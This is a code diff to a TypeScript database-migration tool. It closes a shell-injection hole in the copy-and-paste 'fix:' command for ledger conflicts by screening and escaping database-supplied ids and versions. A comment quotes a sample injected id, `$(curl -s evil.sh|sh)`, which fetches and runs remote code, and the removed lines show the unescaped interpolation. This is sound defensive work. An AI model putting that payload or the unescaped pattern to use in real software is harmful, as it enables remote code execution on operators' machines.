@@ -10,7 +10,7 @@ import { expectedQueryLoop } from './expected-loop';
 import type { SchemaDescription } from './introspect';
 import { migrateConcurrent, migrationConflict, rollbackStepsInvalid } from './migration-errors';
 import { poolProfileFor } from './pool-profile';
-import { raw, sql } from './sql';
+import { literal, raw, shellInertIdentifier, sql } from './sql';
 import { SQLSTATE, sqlState } from './sqlstate';
 import { statementsOf } from './statement-split';
 import { type DbTx, withTransaction } from './transaction';
@@ -164,8 +164,7 @@ export function auditLedger(
       // and backfill — and this is one of the two errors most likely to fire during a real deploy.
       // A `fix:` is copied and run verbatim, so it names the ledger read that works anywhere psql
       // does, and the one edit that resolves the disagreement.
-      `deploy app version "${first.app_version}" — or, if that build is gone, drop its row: ` +
-        `psql "$DATABASE_URL" -c "delete from ${LEDGER_TABLE} where id = '${first.id}'"`,
+      conflictFix(first),
     );
   }
 
@@ -179,6 +178,35 @@ export function auditLedger(
       `x db gen "fix ${migration.name}"   # never edit an applied migration, add a new one`,
     );
   }
+}
+
+/**
+ * Both halves of that `fix:` are the DATABASE's own text — whoever can write a ledger row picks
+ * what lands in a line an operator pastes — and it goes inside SHELL DOUBLE QUOTES, where `$(…)`
+ * and a backtick substitute before psql is reached at all. Measured before this screen: an id of
+ * `$(curl -s evil.sh|sh)` produced exactly that command. `shellInertIdentifier` is the tree's ONE
+ * screen for a name reaching a `fix:`, and a refusal DEGRADES the line to prose naming no command
+ * — the shape `drift-findings.ts` already uses — because there is no quoted form that makes a
+ * hostile name safe to paste.
+ *
+ * The id is rendered through `literal()` on the way into the statement, not interpolated: a `'`
+ * is legal in an identifier and inert in a shell, so the screen passes it deliberately, and it
+ * would close the SQL string literal it is spliced into.
+ */
+function conflictFix(row: LedgerRow): string {
+  const inertId = shellInertIdentifier(row.id);
+  const inertVersion = shellInertIdentifier(row.app_version);
+  if (inertId === null || inertVersion === null) {
+    return (
+      'deploy the app version named in this error, or drop its ledger row by hand — its ' +
+      'migration id or its app version carries a backtick, a dollar sign, a double quote, a ' +
+      'backslash or whitespace, so no command here can spell it'
+    );
+  }
+  return (
+    `deploy app version "${row.app_version}" — or, if that build is gone, drop its row: ` +
+    `psql "$DATABASE_URL" -c "delete from ${LEDGER_TABLE} where id = ${literal(row.id).text}"`
+  );
 }
 
 export function pendingMigrations(
